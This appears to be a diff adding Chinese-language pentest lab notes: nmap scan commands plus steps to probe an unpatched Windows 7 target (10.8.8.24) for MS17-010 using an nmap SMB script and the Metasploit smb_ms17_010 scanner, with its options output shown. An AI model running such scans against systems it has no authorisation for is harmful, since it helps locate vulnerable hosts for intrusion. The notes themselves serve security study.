@@ -29,3 +29,46 @@ Nmap done: 1 IP address (0 hosts up) scanned in 2.00 seconds
 * sudo nmap -T4 -sT -O 192.168.0.1
 #### 整合
 * sudo  nmap -T4 -sT -p 1-65535 -r -sC -sV 192.168.0.1
+##
+####
+1. 找一台未修補 ms17-010 的 Windows 7 做為攻擊目標
+* scan w script: https://nmap.org/nsedoc/scripts/smb-os-discovery.html
+* sudo nmap --script smb-os-discovery.nse -d -p445 10.8.8.24
+2. metasploit : msfconsole
+```
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting      Required  Description
+   ----         ---------------      --------  -----------
+   CHECK_ARCH   true                 no        Check for architecture on vulner
+                                               able hosts
+   CHECK_DOPU   true                 no        Check for DOUBLEPULSAR on vulner
+                                               able hosts
+   CHECK_PIPE   false                no        Check for named pipe on vulnerab
+                                               le hosts
+   NAMED_PIPES  /opt/metasploit-fra  yes       List of named pipes to check
+                mework/embedded/fra
+                mework/data/wordlis
+                ts/named_pipes.txt
+   RHOSTS                            yes       The target host(s), see https://
+                                               github.com/rapid7/metasploit-fra
+                                               mework/wiki/Using-Metasploit
+   RPORT        445                  yes       The SMB service port (TCP)
+   SMBDomain    .                    no        The Windows domain to use for au
+                                               thentication
+   SMBPass                           no        The password for the specified u
+                                               sername
+   SMBUser                           no        The username to authenticate as
+   THREADS      1                    yes       The number of concurrent threads
+                                                (max one per host)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.8.8.24
+msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit
+```
